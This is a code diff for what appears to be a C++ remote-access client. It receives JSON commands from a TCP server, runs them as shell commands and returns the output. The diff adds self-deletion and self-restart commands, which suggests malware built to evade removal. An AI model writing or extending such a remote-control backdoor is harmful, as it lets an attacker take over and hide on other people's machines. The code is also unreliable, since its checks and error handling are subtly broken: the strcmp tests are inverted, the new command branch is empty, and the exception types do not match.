@@ -12,6 +12,7 @@
 #include "include/rapidjson/document.h"
 #include "include/rapidjson/writer.h"
 #include "include/rapidjson/stringbuffer.h"
+#include "misc.hpp"
 
 using boost::asio::ip::tcp;
 
@@ -34,36 +35,68 @@ std::string execCommand(const char* cmd) {
 }
 
 /*
+此处解析特有命令，包括如下
+
+自删除 removeitself
+重启   restart
+
+
+*/
+void parser_xirancmd(char* xirancmd)
+{
+    if(strcmp(xirancmd,"removeitself")){
+        misc::remove_itself();
+    }
+
+    if(strcmp(xirancmd,"restart")){
+        misc::restart_itself();
+    }
+
+}
+
+/*
 调用命令解析器，并将结果发回服务器
 */
 tcp::socket TCP_start_parser_msg(tcp::socket socket,std::unique_ptr<char[]> data)
 {
-    //使用json解析命令
-    rapidjson::Document d_shell;
-    d_shell.Parse(data.get());
-    assert(d_shell.GetType()==3);
+    try{
+            //使用json解析命令
+        rapidjson::Document d_shell;
+        d_shell.Parse(data.get());
+        if(d_shell.GetType()!=3) throw "msg parse error";
 
-    rapidjson::Value& data_type = d_shell["type"];
-    assert(data_type.GetType()==5);
+        rapidjson::Value& data_type = d_shell["type"];
+        if(data_type.GetType()!=5) throw "msg parse error";
 
-    if(strcmp(data_type.GetString(),"cmd")==0){
-        rapidjson::Value& cmddata = d_shell["cmddata"];
-        assert(cmddata.GetType()==5);
-        auto res = execCommand(cmddata.GetString());
+        if(strcmp(data_type.GetString(),"cmd")==0){  //执行cmd命令
+            rapidjson::Value& cmddata = d_shell["cmddata"];
+            if(cmddata.GetType()!=5) throw "msg parse error";
+            auto res = execCommand(cmddata.GetString());
 
-        if(res=="") res = "no output!";
+            if(res=="") res = "no output!";
 
-        boost::asio::write(socket, boost::asio::buffer(res));
-        //执行cmd命令
-    }else if(strcmp(data_type.GetString(),"change_config")==0){
-        //修改配置文件
-        const char msg[] = "Function not yet implemented"; 
-        boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
-    }else{
-        const char msg[] = "type error"; 
-        boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
+            boost::asio::write(socket, boost::asio::buffer(res));
+            
+        }else if(strcmp(data_type.GetString(),"change_config")==0){//修改配置文件
+            const char msg[] = "Function not yet implemented"; 
+            boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
+        }else if(strcmp(data_type.GetString(),"xirancmd")==0){//执行特有命令
+            
+            
+        }else{
+            const char msg[] = "type error"; 
+            boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
+        }
+        return socket;
+    }catch(std::string e){
+        if(e=="msg parse error"){
+            const char msg[] = "msg parse error"; 
+            boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
+        }else{
+            boost::asio::write(socket, boost::asio::buffer(e, e.length()));
+        }
     }
-    return socket;
+    
 }
 
 /*
@@ -108,10 +141,13 @@ void start_TCP()
                     printf("[start_TCP] reply_length : %d\n",reply_length);
                 #endif
 
+                //测试使用
                 assert(reply_length==sizeof(int));
 
                 std::unique_ptr<char[]> data(new char[data_len+1]);
                 reply_length = boost::asio::read(socket, boost::asio::buffer(data.get(), data_len));
+
+                //测试使用
                 assert(reply_length==data_len);
 
                 data[data_len]='\0';
